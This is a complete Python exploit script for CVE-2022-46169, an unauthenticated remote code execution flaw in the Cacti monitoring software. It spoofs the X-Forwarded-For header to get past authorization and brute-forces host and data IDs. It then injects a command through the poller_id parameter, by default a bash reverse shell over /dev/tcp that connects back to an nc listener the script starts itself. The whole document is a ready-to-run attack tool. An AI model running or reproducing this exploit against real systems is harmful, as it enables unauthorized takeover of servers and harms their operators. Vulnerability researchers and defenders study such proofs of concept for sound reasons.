#!/usr/bin/python3
# Unauthenticated Remote Code Execution on Cacti <= 1.2.22

from argparse import ArgumentParser
from urllib.request import Request, urlopen
from urllib.parse import quote
from json import loads
from subprocess import Popen

def check_vulnerable(url:str) -> bool:
    """Check if application is vulnerable."""
    req = Request(url=f'{url}/remote_agent.php', method='GET')
    req.add_header('X-Forwarded-For', '127.0.0.1')
    res = urlopen(req)
    if res.status == 200 and res.read().decode() != 'FATAL: You are not authorized to use this service':
        return True
    else: return False

def check_response(res:str) -> bool:
    """Check response if id's were found."""
    if res != '[]':
        data = loads(res.removeprefix('[').removesuffix(']'))
        if data.get('rrd_name') == 'uptime' or data.get('rrd_name') == 'polling_time':
            return True
        else: return False
    else: return False

def bruteforce(url:str) -> tuple[int, int]:
    """Bruteforce ids."""
    for _0 in range(5):
        for _1 in range(10):
            req = Request(url=f'{url}/remote_agent.php?action=polldata&poller_id=1&host_id={_0}&local_data_ids[]={_1}', method='GET')
            req.add_header('X-Forwarded-For', '127.0.0.1')
            res = urlopen(req).read().decode()
            if check_response(res): return _0, _1
    else: exit('Bruteforcing failed...')

def check_ids(url:str, host_id:str, local_data_ids:str) -> bool:
    """Check if provided input id's are correct."""
    req = Request(url=f'{url}/remote_agent.php?action=polldata&poller_id=1&host_id={host_id}&local_data_ids[]={local_data_ids}', method='GET')
    req.add_header('X-Forwarded-For', '127.0.0.1')
    res = urlopen(req).read().decode()
    if check_response(res): return True
    else: exit('The provided id\'s were wrong...')

def reverse_shell(url:str, host_id:str, local_data_ids:str, ip:str, port:str, revshell:str) -> None:
    """Establish reverse shell."""
    Popen(['nc', '-vlnp', f'{port}'])
    req = Request(url=f'{url}/remote_agent.php?action=polldata&poller_id=;{quote(revshell.format(ip, port))}&host_id={host_id}&local_data_ids[]={local_data_ids}', method='GET')
    req.add_header('X-Forwarded-For', '127.0.0.1')
    try: urlopen(req)
    except KeyboardInterrupt: pass

if __name__ == '__main__':
    parser = ArgumentParser(
        prog='CVE-2022-46169',
        description='Unauthenticated RCE on Cacti <= 1.2.22 [CVE-2022-46169]',
        epilog='If host-id and local-data-ids are specified, bruteforcing will be skipped.',
        usage='python3 CVE-2022-46169 --lhost <your-ip> --lport <any-port> url'
    )
    parser.add_argument('url', help='URL of target')
    parser.add_argument('--lhost', required=True, help='listen IP')
    parser.add_argument('--lport', required=True, help='listen port')
    parser.add_argument('--host-id', help='host-id for request')
    parser.add_argument('--local-data-ids', help='local-data-ids for request')
    parser.add_argument('--revshell', default='bash -c "sh -i >& /dev/tcp/{}/{} 0>&1"', help='your own reverse shell')
    args = parser.parse_args()
    
    if check_vulnerable(args.url):
        print('Website vulnerable: True')
        if args.host_id is not None and args.local_data_ids is not None:
            if check_ids(args.url, args.host_id, args.local_data_ids):
                host_id = args.host_id
                local_data_ids = args.local_data_ids
                print('ID\'s valid: True')
        else:
            print('Bruteforcing...')
            host_id, local_data_ids = bruteforce(args.url)
            print('Succeed!')
        print('Establish reverse shell...')
        reverse_shell(args.url, host_id, local_data_ids, args.lhost, args.lport, args.revshell)
